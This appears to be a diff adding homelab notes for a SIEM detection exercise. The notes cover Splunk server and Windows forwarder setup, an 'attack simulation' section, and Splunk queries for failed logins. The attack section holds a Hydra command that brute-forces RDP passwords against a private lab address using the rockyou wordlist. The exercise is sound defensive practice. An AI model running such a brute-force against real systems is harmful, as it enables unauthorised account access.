@@ -1,0 +1,81 @@
+# ================================
+
+# UBUNTU (SPLUNK SERVER)
+
+# ================================
+
+# Start Splunk
+
+sudo /opt/splunk/bin/splunk start
+
+# Enable receiving port
+
+sudo /opt/splunk/bin/splunk enable listen 9997
+
+# Verify listening port
+
+sudo /opt/splunk/bin/splunk list listen
+
+# Allow firewall
+
+sudo ufw allow 9997
+
+# Get IP address
+
+ip a
+
+# ================================
+
+# WINDOWS (FORWARDER SETUP)
+
+# ================================
+
+# Navigate to forwarder directory
+
+cd "C:\Program Files\SplunkUniversalForwarder\bin"
+
+# Start forwarder
+
+splunk start
+
+# Add Splunk server
+
+splunk add forward-server 192.168.56.xxx:9997
+
+# Verify connection
+
+splunk list forward-server
+
+# Add Windows logs (IMPORTANT)
+
+splunk add input WinEventLog://Security
+splunk add input WinEventLog://System
+splunk add input WinEventLog://Application
+
+# Restart forwarder
+
+splunk restart
+
+# ================================
+
+# KALI (ATTACK SIMULATION)
+
+# ================================
+
+# Hydra brute-force attack
+
+hydra -t 1 -W 3 -l test -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.xxx
+
+# ================================
+
+# SPLUNK QUERIES
+
+# ================================
+
+# View security logs
+
+index=* sourcetype="WinEventLog:Security"
+
+# Detect failed logins
+
+index=* EventCode=4625
